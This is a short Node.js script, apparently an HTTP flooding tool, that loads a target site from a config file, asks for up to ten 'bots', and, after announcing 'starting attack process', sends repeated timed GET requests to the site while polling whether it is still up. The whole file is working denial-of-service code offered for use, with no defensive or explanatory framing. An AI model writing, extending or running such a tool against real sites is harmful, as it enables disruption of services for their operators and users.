import fs from 'fs-extra';
import axios from 'axios';
import utils from './src/utils.js';
import rl from 'readline-sync';
const cwd = process.cwd();

(async () => {
  const config = fs.readJSONSync(`${cwd}/config.json`);
  const {
    pingInterval,
    checkInterval
  } = config;
  const { 
    site, userAgent 
  } = config.siteConfig;

  console.log('[+]: Fetching site..');
  utils.sleep(1500);

  let numBots = rl.questionInt('Enter the number of bots (1-10): ');
  numBots = Math.min(numBots, 10);

  try {
    const response = await axios.get(site);
    if (!response) {
      utils.sleep(200);
      console.log('[-]: Site is down.');
    } else {
      utils.sleep(200);
      console.log('[+]: Site up!, starting attack process.');

      const ping = async () => {
        try {
          await axios.get(site, {
            headers: {
              'User-Agent': userAgent,
            },
          });
          console.log('[+]: Ping successful');
        } catch (error) {
          console.error('[-]: Error in ping:', error);
        }
      };

      for (let i = 0; i < numBots; i++) {
        setInterval(ping, pingInterval);
      }
      
      setInterval(utils.checkSite, checkInterval);
    }
  } catch (error) {
    utils.sleep(1500);
    console.log(`[-]: An error occurred: ${error}`);
  }
})();
